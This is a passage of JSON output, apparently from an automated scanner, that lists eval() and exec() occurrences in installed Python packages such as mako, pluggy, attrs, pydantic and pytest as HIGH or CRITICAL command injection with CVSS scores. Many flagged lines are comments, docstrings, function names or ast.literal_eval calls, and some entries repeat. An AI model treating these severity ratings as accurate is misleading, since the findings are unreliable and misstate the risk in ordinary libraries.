            "context": "            \"def %s(%s):\" % (node.funcname, \",\".join(namedecls))\n        )\n        filtered = len(node.filter_args.args) > 0\n        buffered = eval(node.attributes.get(\"buffered\", \"False\"))\n        cached = eval(node.attributes.get(\"cached\", \"False\"))\n        self.printer.writelines(\n            # push new frame, assign current frame to __M_caller",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/mako/codegen.py",
            "line": 612,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cached = eval(node.attributes.get(\"cached\", \"False\"))",
            "context": "        )\n        filtered = len(node.filter_args.args) > 0\n        buffered = eval(node.attributes.get(\"buffered\", \"False\"))\n        cached = eval(node.attributes.get(\"cached\", \"False\"))\n        self.printer.writelines(\n            # push new frame, assign current frame to __M_caller\n            \"__M_caller = context.caller_stack._push_frame()\",",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/mako/codegen.py",
            "line": 725,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cache_args[\"timeout\"] = int(eval(cache_args[\"timeout\"]))",
            "context": "            if pa.startswith(\"cache_\") and pa != \"cache_key\"\n        )\n        if \"timeout\" in cache_args:\n            cache_args[\"timeout\"] = int(eval(cache_args[\"timeout\"]))\n\n        self.printer.writeline(\"def %s(%s):\" % (name, \",\".join(args)))\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/mako/template.py",
            "line": 680,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# this exec() works for 2.4->3.3.",
            "context": "    module = types.ModuleType(cid)\n    code = compile(source, cid, \"exec\")\n\n    # this exec() works for 2.4->3.3.\n    exec(code, module.__dict__, module.__dict__)\n    return (source, module)\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/mako/template.py",
            "line": 681,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, module.__dict__, module.__dict__)",
            "context": "    code = compile(source, cid, \"exec\")\n\n    # this exec() works for 2.4->3.3.\n    exec(code, module.__dict__, module.__dict__)\n    return (source, module)\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/more_itertools/recipes.py",
            "line": 1103,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def polynomial_eval(coefficients, x):",
            "context": "    yield from sorted(primes)\n\n\ndef polynomial_eval(coefficients, x):\n    \"\"\"Evaluate a polynomial at a specific value.\n\n    Computes with better numeric stability than Horner's method.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/more_itertools/recipes.py",
            "line": 1112,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> polynomial_eval(coefficients, x)",
            "context": "\n    >>> coefficients = [1, -4, -17, 60]\n    >>> x = 2.5\n    >>> polynomial_eval(coefficients, x)\n    8.125\n\n    Supports all numeric types: int, float, complex, Decimal, Fraction.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/typing_inspection/typing_objects.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(func_code, globals_, locals_)",
            "context": "\n    locals_: dict[str, Any] = {}\n    globals_: dict[str, Any] = {'Any': Any, 'typing': typing, 'typing_extensions': typing_extensions}\n    exec(func_code, globals_, locals_)\n    return locals_[function_name]\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/typing_inspection/typing_objects.py",
            "line": 132,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(func_code, globals_, locals_)",
            "context": "\n    locals_: dict[str, Any] = {}\n    globals_: dict[str, Any] = {'Any': Any, 'typing': typing, 'typing_extensions': typing_extensions}\n    exec(func_code, globals_, locals_)\n    return locals_[function_name]\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/packaging/_parser.py",
            "line": 332,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = ast.literal_eval(python_str)",
            "context": "\n\ndef process_python_str(python_str: str) -> Value:\n    value = ast.literal_eval(python_str)\n    return Value(str(value))\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pluggy/_manager.py",
            "line": 111,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _hookexec(",
            "context": "        )\n        self._inner_hookexec = _multicall\n\n    def _hookexec(\n        self,\n        hook_name: str,\n        methods: Sequence[HookImpl],",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pluggy/_manager.py",
            "line": 120,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return self._inner_hookexec(hook_name, methods, kwargs, firstresult)",
            "context": "    ) -> object | list[object]:\n        # called from all hookcaller instances.\n        # enable_tracing will set its own wrapping function at self._inner_hookexec\n        return self._inner_hookexec(hook_name, methods, kwargs, firstresult)\n\n    def register(self, plugin: _Plugin, name: str | None = None) -> str | None:\n        \"\"\"Register a plugin and return its name.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pluggy/_manager.py",
            "line": 464,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def traced_hookexec(",
            "context": "        \"\"\"\n        oldcall = self._inner_hookexec\n\n        def traced_hookexec(\n            hook_name: str,\n            hook_impls: Sequence[HookImpl],\n            caller_kwargs: Mapping[str, object],",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pluggy/_hooks.py",
            "line": 512,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return self._hookexec(self.name, self._hookimpls.copy(), kwargs, firstresult)",
            "context": "        self._verify_all_args_are_provided(kwargs)\n        firstresult = self.spec.opts.get(\"firstresult\", False) if self.spec else False\n        # Copy because plugins may register other plugins during iteration (#438).\n        return self._hookexec(self.name, self._hookimpls.copy(), kwargs, firstresult)\n\n    def call_historic(\n        self,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pluggy/_hooks.py",
            "line": 534,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = self._hookexec(self.name, self._hookimpls.copy(), kwargs, False)",
            "context": "        # Historizing hooks don't return results.\n        # Remember firstresult isn't compatible with historic.\n        # Copy because plugins may register other plugins during iteration (#438).\n        res = self._hookexec(self.name, self._hookimpls.copy(), kwargs, False)\n        if result_callback is None:\n            return\n        if isinstance(res, list):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pluggy/_hooks.py",
            "line": 573,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return self._hookexec(self.name, hookimpls, kwargs, firstresult)",
            "context": "                i -= 1\n            hookimpls.insert(i + 1, hookimpl)\n        firstresult = self.spec.opts.get(\"firstresult\", False) if self.spec else False\n        return self._hookexec(self.name, hookimpls, kwargs, firstresult)\n\n    def _maybe_apply_history(self, method: HookImpl) -> None:\n        \"\"\"Apply call history to a new hookimpl if it is marked as historic.\"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pluggy/_hooks.py",
            "line": 580,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = self._hookexec(self.name, [method], kwargs, False)",
            "context": "        if self.is_historic():\n            assert self._call_history is not None\n            for kwargs, result_callback in self._call_history:\n                res = self._hookexec(self.name, [method], kwargs, False)\n                if res and result_callback is not None:\n                    # XXX: remember firstresult isn't compat with historic\n                    assert isinstance(res, list)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/wheel.py",
            "line": 190,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(req, **env):",
            "context": "            req.marker = None\n            return str(req)\n\n        def eval(req, **env):\n            return not req.marker or req.marker.evaluate(env)\n\n        def for_extra(req):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/wheel.py",
            "line": 211,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(req for req in reqs if for_extra(req) and eval(req, extra=extra)),",
            "context": "            extra: list(\n                map(\n                    raw_req,\n                    (req for req in reqs if for_extra(req) and eval(req, extra=extra)),\n                )\n            )\n            for extra in extras",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/launch.py",
            "line": 32,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, namespace)",
            "context": "        script = fid.read()\n    norm_script = script.replace('\\\\r\\\\n', '\\\\n')\n    code = compile(norm_script, script_name, 'exec')\n    exec(code, namespace)\n\n\nif __name__ == '__main__':",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/build_meta.py",
            "line": 317,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, locals())",
            "context": "            code = f.read().replace(r'\\r\\n', r'\\n')\n\n        try:\n            exec(code, locals())\n        except SystemExit as e:\n            if e.code:\n                raise",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/rich/markup.py",
            "line": 190,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "meta_params = literal_eval(parameters)",
            "context": "                            )\n\n                        try:\n                            meta_params = literal_eval(parameters)\n                        except SyntaxError as error:\n                            raise MarkupError(\n                                f\"error parsing {parameters!r} in {open_tag.parameters!r}; {error.msg}\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/anyio/to_interpreter.py",
            "line": 111,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if exc_info := interpreters.exec(self._interpreter_id, self._run_func):",
            "context": "\n        res: Any\n        is_exception: bool\n        if exc_info := interpreters.exec(self._interpreter_id, self._run_func):\n            raise BrokenWorkerIntepreter(exc_info)\n\n        (res, is_exception), fmt = queues.get(self._queue_id)[:2]",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/automat/_runtimeproto.py",
            "line": 50,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(it, ann, eval(annotation, method.__globals__))",
            "context": "def _fixAnnotation(method: Callable[..., object], it: object, ann: str) -> None:\n    annotation = getattr(it, ann)\n    if isinstance(annotation, str):\n        setattr(it, ann, eval(annotation, method.__globals__))\n\n\ndef _liveSignature(method: Callable[..., object]) -> Signature:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/prometheus_client/decorator.py",
            "line": 195,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, evaldict)",
            "context": "        filename = '<decorator-gen-%d>' % (next(self._compile_count),)\n        try:\n            code = compile(src, filename, 'single')\n            exec(code, evaldict)\n        except:\n            print('Error in generated code:', file=sys.stderr)\n            print(src, file=sys.stderr)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/attr/_make.py",
            "line": 212,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _compile_and_eval(",
            "context": "    )\n\n\ndef _compile_and_eval(\n    script: str,\n    globs: dict[str, Any] | None,\n    locs: Mapping[str, object] | None = None,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/attr/_make.py",
            "line": 223,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eval(bytecode, globs, locs)",
            "context": "    variables.\n    \"\"\"\n    bytecode = compile(script, filename, \"exec\")\n    eval(bytecode, globs, locs)\n\n\ndef _linecache_and_compile(",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/attr/_make.py",
            "line": 256,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "_compile_and_eval(script, globs, locs, filename)",
            "context": "        filename = f\"{base_filename[:-1]}-{count}>\"\n        count += 1\n\n    _compile_and_eval(script, globs, locs, filename)\n\n    return locs\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/attr/_make.py",
            "line": 1635,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "_compile_and_eval(",
            "context": "    script, globs = _make_hash_script(\n        cls, attrs, frozen=False, cache_hash=False\n    )\n    _compile_and_eval(\n        script, globs, filename=_generate_unique_filename(cls, \"__hash__\")\n    )\n    cls.__hash__ = globs[\"__hash__\"]",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/attr/_make.py",
            "line": 1755,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "_compile_and_eval(",
            "context": "        attrs = cls.__attrs_attrs__\n\n    script, globs = _make_eq_script(attrs)\n    _compile_and_eval(\n        script, globs, filename=_generate_unique_filename(cls, \"__eq__\")\n    )\n    cls.__eq__ = globs[\"__eq__\"]",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/attr/_make.py",
            "line": 1829,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "_compile_and_eval(",
            "context": "        attrs = cls.__attrs_attrs__\n\n    script, globs = _make_repr_script(attrs, ns)\n    _compile_and_eval(\n        script, globs, filename=_generate_unique_filename(cls, \"__repr__\")\n    )\n    cls.__repr__ = globs[\"__repr__\"]",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/_internal/_namespace_utils.py",
            "line": 37,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return eval(typ, *ns)",
            "context": "\n    ```python {lint=\"skip\" test=\"skip\"}\n    def eval_type(typ: type[Any], ns: NamespacesTuple) -> None:\n        return eval(typ, *ns)\n    ```\n    \"\"\"\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/_internal/_typing_extra.py",
            "line": 623,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/_internal/_typing_extra.py",
            "line": 623,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/_internal/_typing_extra.py",
            "line": 656,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# the globalns and localns order so that eval() looks into",
            "context": "                    # This is surprising, but required.  Before Python 3.10,\n                    # get_type_hints only evaluated the globalns of\n                    # a class.  To maintain backwards compatibility, we reverse\n                    # the globalns and localns order so that eval() looks into\n                    # *base_globals* first rather than *base_locals*.\n                    # This only affects ForwardRefs.\n                    base_globals, base_locals = base_locals, base_globals",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/v1/utils.py",
            "line": 195,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eval('__IPYTHON__')",
            "context": "    Check whether we're in an ipython environment, including jupyter notebooks.\n    \"\"\"\n    try:\n        eval('__IPYTHON__')\n    except NameError:\n        return False\n    else:  # pragma: no cover",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/tests/test_connections.py",
            "line": 359,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tcp4_addr = eval(wait_for_file(testfile, delete=True))",
            "context": "        # launch various subprocess instantiating a socket of various\n        # families and types to enrich psutil results\n        tcp4_proc = self.pyrun(tcp4_template)\n        tcp4_addr = eval(wait_for_file(testfile, delete=True))\n        udp4_proc = self.pyrun(udp4_template)\n        udp4_addr = eval(wait_for_file(testfile, delete=True))\n        if supports_ipv6():",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/tests/test_connections.py",
            "line": 361,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "udp4_addr = eval(wait_for_file(testfile, delete=True))",
            "context": "        tcp4_proc = self.pyrun(tcp4_template)\n        tcp4_addr = eval(wait_for_file(testfile, delete=True))\n        udp4_proc = self.pyrun(udp4_template)\n        udp4_addr = eval(wait_for_file(testfile, delete=True))\n        if supports_ipv6():\n            tcp6_proc = self.pyrun(tcp6_template)\n            tcp6_addr = eval(wait_for_file(testfile, delete=True))",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/tests/test_connections.py",
            "line": 364,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tcp6_addr = eval(wait_for_file(testfile, delete=True))",
            "context": "        udp4_addr = eval(wait_for_file(testfile, delete=True))\n        if supports_ipv6():\n            tcp6_proc = self.pyrun(tcp6_template)\n            tcp6_addr = eval(wait_for_file(testfile, delete=True))\n            udp6_proc = self.pyrun(udp6_template)\n            udp6_addr = eval(wait_for_file(testfile, delete=True))\n        else:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/tests/test_connections.py",
            "line": 366,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "udp6_addr = eval(wait_for_file(testfile, delete=True))",
            "context": "            tcp6_proc = self.pyrun(tcp6_template)\n            tcp6_addr = eval(wait_for_file(testfile, delete=True))\n            udp6_proc = self.pyrun(udp6_template)\n            udp6_addr = eval(wait_for_file(testfile, delete=True))\n        else:\n            tcp6_proc = None\n            udp6_proc = None",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/tests/__init__.py",
            "line": 1370,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "#     os.system(\"tasklist\")",
            "context": "    sys.stdout.flush()\n\n    # if WINDOWS:\n    #     os.system(\"tasklist\")\n    # elif shutil.which(\"ps\"):\n    #     os.system(\"ps aux\")\n    # print(\"=\" * 70, file=sys.stderr)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/tests/__init__.py",
            "line": 1372,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "#     os.system(\"ps aux\")",
            "context": "    # if WINDOWS:\n    #     os.system(\"tasklist\")\n    # elif shutil.which(\"ps\"):\n    #     os.system(\"ps aux\")\n    # print(\"=\" * 70, file=sys.stderr)\n\n    sys.stdout.flush()",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/_py/path.py",
            "line": 1153,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), mod.__dict__)",
            "context": "                sys.modules[modname] = mod\n                try:\n                    with open(str(self), \"rb\") as f:\n                        exec(f.read(), mod.__dict__)\n                except BaseException:\n                    del sys.modules[modname]\n                    raise",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/_py/path.py",
            "line": 1159,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def sysexec(self, *argv: os.PathLike[str], **popen_opts: Any) -> str:",
            "context": "                    raise\n                return mod\n\n    def sysexec(self, *argv: os.PathLike[str], **popen_opts: Any) -> str:\n        \"\"\"Return stdout text from executing a system child process,\n        where the 'self' path points to executable.\n        The process is directly invoked and not through a system shell.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/mark/expression.py",
            "line": 281,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"\"\"Adapts a matcher function to a locals mapping as required by eval().\"\"\"",
            "context": "\n\nclass MatcherAdapter(Mapping[str, MatcherNameAdapter]):\n    \"\"\"Adapts a matcher function to a locals mapping as required by eval().\"\"\"\n\n    def __init__(self, matcher: MatcherCall) -> None:\n        self.matcher = matcher",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/mark/expression.py",
            "line": 330,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ret: bool = bool(eval(self.code, {\"__builtins__\": {}}, MatcherAdapter(matcher)))",
            "context": "\n        :returns: Whether the expression matches or not.\n        \"\"\"\n        ret: bool = bool(eval(self.code, {\"__builtins__\": {}}, MatcherAdapter(matcher)))\n        return ret\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/mark/__init__.py",
            "line": 68,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_eval(test_input, expected):",
            "context": "                pytest.param(\"6*9\", 42, marks=pytest.mark.xfail),\n            ],\n        )\n        def test_eval(test_input, expected):\n            assert eval(test_input) == expected\n\n    :param values: Variable args of the values of the parameter set, in order.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/mark/__init__.py",
            "line": 69,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert eval(test_input) == expected",
            "context": "            ],\n        )\n        def test_eval(test_input, expected):\n            assert eval(test_input) == expected\n\n    :param values: Variable args of the values of the parameter set, in order.\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/assertion/rewrite.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(co, module.__dict__)",
            "context": "                    self._writing_pyc = False\n        else:\n            state.trace(f\"found cached rewritten pyc for {fn}\")\n        exec(co, module.__dict__)\n\n    def _early_rewrite_bailout(self, name: str, state: AssertionState) -> bool:\n        \"\"\"A fast way to get out of rewriting modules.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/_code/code.py",
            "line": 162,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(self, code, **vars):",
            "context": "            return Source(\"\")\n        return self.code.fullsource.getstatement(self.lineno)\n\n    def eval(self, code, **vars):\n        \"\"\"Evaluate 'code' in the frame.\n\n        'vars' are optional additional local variables.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/_code/code.py",
            "line": 171,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return eval(code, self.f_globals, f_locals)",
            "context": "        \"\"\"\n        f_locals = self.f_locals.copy()\n        f_locals.update(vars)\n        return eval(code, self.f_globals, f_locals)\n\n    def repr(self, object: object) -> str:\n        \"\"\"Return a 'safe' (non-recursive, one-line) string repr for 'object'.\"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/_code/code.py",
            "line": 324,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# however via `exec(...)` / `eval(...)` they can be other types",
            "context": "        tbh: bool | Callable[[ExceptionInfo[BaseException] | None], bool] = False\n        for maybe_ns_dct in (self.frame.f_locals, self.frame.f_globals):\n            # in normal cases, f_locals and f_globals are dictionaries\n            # however via `exec(...)` / `eval(...)` they can be other types\n            # (even incorrect types!).\n            # as such, we suppress all exceptions while accessing __tracebackhide__\n            try:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/_code/code.py",
            "line": 324,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# however via `exec(...)` / `eval(...)` they can be other types",
            "context": "        tbh: bool | Callable[[ExceptionInfo[BaseException] | None], bool] = False\n        for maybe_ns_dct in (self.frame.f_locals, self.frame.f_globals):\n            # in normal cases, f_locals and f_globals are dictionaries\n            # however via `exec(...)` / `eval(...)` they can be other types\n            # (even incorrect types!).\n            # as such, we suppress all exceptions while accessing __tracebackhide__\n            try:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/zope/interface/tests/test_advice.py",
            "line": 65,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_inside_exec(self):",
            "context": "        for d in module.__dict__, f_globals:\n            self.assertIs(d, globals())\n\n    def test_inside_exec(self):\n        from zope.interface.advice import getFrameInfo\n        _globals = {'getFrameInfo': getFrameInfo}\n        _locals = {}",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/zope/interface/tests/test_advice.py",
            "line": 69,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(_FUNKY_EXEC, _globals, _locals)",
            "context": "        from zope.interface.advice import getFrameInfo\n        _globals = {'getFrameInfo': getFrameInfo}\n        _locals = {}\n        exec(_FUNKY_EXEC, _globals, _locals)\n        self.assertEqual(_locals['kind'], \"exec\")\n        self.assertIs(_locals['f_locals'], _locals)\n        self.assertIsNone(_locals['module'])",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/zope/interface/tests/test_declarations.py",
            "line": 39,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, globs, locs)",
            "context": "            warnings.resetwarnings()\n\n            try:\n                exec(code, globs, locs)\n            except TypeError:\n                return False\n            else:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/zope/interface/tests/test_declarations.py",
            "line": 2083,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(CODE, globs, locs)",
            "context": "            'def foo():',\n            '    moduleProvides(IFoo)'\n        ])\n        exec(CODE, globs, locs)\n        foo = locs['foo']\n        self.assertRaises(TypeError, foo)\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/zope/interface/tests/test_declarations.py",
            "line": 2099,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(CODE, globs, locs)",
            "context": "            '    moduleProvides(IFoo)',\n        ])\n        with self.assertRaises(TypeError):\n            exec(CODE, globs, locs)\n\n    def test_called_once_from_module_scope(self):\n        from zope.interface.declarations import moduleProvides",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/zope/interface/tests/test_declarations.py",
            "line": 2110,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(CODE, globs)",
            "context": "        CODE = \"\\n\".join([\n            'moduleProvides(IFoo)',\n        ])\n        exec(CODE, globs)\n        spec = globs['__provides__']\n        self.assertEqual(list(spec), [IFoo])\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/zope/interface/tests/test_declarations.py",
            "line": 2126,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(CODE, globs)",
            "context": "            'moduleProvides(IFoo)',\n        ])\n        with self.assertRaises(TypeError):\n            exec(CODE, globs)\n\n\nclass Test_getObjectSpecificationFallback(unittest.TestCase):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_property.py",
            "line": 251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "        assert value in str(s)\n        assert priority in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert name == s2.name\n        assert value == s2.value",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssutilsimport.py",
            "line": 10,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('from cssutils import *', namespace)",
            "context": "    def test_import_all(self):\n        \"from cssutils import *\"\n        namespace = {}\n        exec('from cssutils import *', namespace)\n        del namespace['__builtins__']\n        exp = {\n            'CSSParser': cssutils.CSSParser,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_csspagerule.py",
            "line": 420,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert sel in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert sel == s2.selectorText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_medialist.py",
            "line": 191,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
            "context": "\n        assert mediaText in str(s)\n\n        s2 = eval(repr(s))\n        assert isinstance(s2, s.__class__)\n        assert mediaText == s2.mediaText\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cssutils/tests/test_cssstylerule.py",
            "line": 238,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "s2 = eval(repr(s))",
